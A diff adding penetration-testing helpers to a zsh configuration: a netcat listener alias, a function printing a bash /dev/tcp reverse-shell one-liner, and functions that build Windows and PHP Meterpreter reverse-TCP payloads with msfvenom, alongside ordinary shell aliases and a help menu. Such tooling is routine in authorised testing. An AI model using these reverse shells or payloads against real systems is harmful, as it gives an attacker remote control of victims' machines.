@@ -1,0 +1,68 @@
+# Pen Test aliases
+alias reload='source ~/.zshrc' 
+alias webserver='python3 -m http.server 8000'
+alias shlistener='nc -u -lvp 4444'
+
+alias ..='cd ..'
+alias ...='cd ../..'
+alias ....='cd ../../..'
+alias ips='ip -c addr'
+alias routes='ip route'
+alias ports='ss -tulpn'
+
+my_ip() {
+  ip route get 1.1.1.1 | awk '{print $7; exit}'
+}
+bash_revshell() {
+  target_ip="$(my_ip)"
+  echo "bash -i >& /dev/tcp/$target_ip/4444 0>&1"
+}
+meterp_win_shell() {
+  target_ip="$(my_ip)"
+  echo "Creating Windows Staged reverse TCP (MSFVenom)"
+  msfvenom -p windows/meterpreter/reverse_tcp LHOST=$target_ip LPORT=4444 -f exe > reverse.exe
+  echo "created reverse.exe"
+}
+
+meterp_php_shell() {
+   target_ip=$(my_ip)
+   echo "Creating Staged PHP Reverse TCP (MSFVenom)"
+   msfvenom -p php/meterpreter/reverse_tcp LHOST=$target_ip LPORT=4444 -f raw -o shell.php
+   echo "Created shell.php"
+}
+
+shell_help() {
+   local BOLD="%B"
+   local RESET="%b"
+   local GREEN="%F{green}"
+   local BLUE="%F{blue}"
+   local YELLOW="%F{yellow}"
+   local CYAN="%F{cyan}"
+   local MAGENTA="%F{magenta}"
+   local RED="%F{red}"
+   local CLEAR="%f"
+   
+  print -P ""
+  print -P "%B%F{cyan}🛠 Shell Helper%b%f"
+  print -P "%F{cyan}──────────────────────────────%f"
+  print -P ""
+
+  print -P "%B%F{green}Reverse / Payload Helpers%b%f"
+  print -P "  %F{yellow}bash_revshell%f    → Simple bash TCP reverse (%F{magenta}Port 4444%f)"
+  print -P "  %F{yellow}meterp_win_shell%f → Windows staged reverse TCP (%F{magenta}Port 4444%f)"
+  print -P "  %F{yellow}meterp_php_shell%f → PHP staged reverse TCP (%F{magenta}Port 4444%f)"
+  print -P ""
+
+  print -P "%B%F{blue}Listeners & Services%b%f"
+  print -P "  %F{yellow}shlistener%f       → Netcat listener (%F{magenta}Port 4444%f)"
+  print -P "  %F{yellow}webserver%f        → Python HTTP file server (%F{magenta}Port 8000%f)"
+  print -P ""
+
+  print -P "%B%F{cyan}Networking Utilities%b%f"
+  print -P "  %F{yellow}my_ip%f            → Show current IPv4 address"
+  print -P "  %F{yellow}bash_simpleportscan.sh%f → Port Scanner with Pentest Help" 
+  print -P ""
+
+  print -P "%F{cyan}Tip:%f Use %F{yellow}TAB%f completion to explore functions quickly."
+  print -P ""
+}
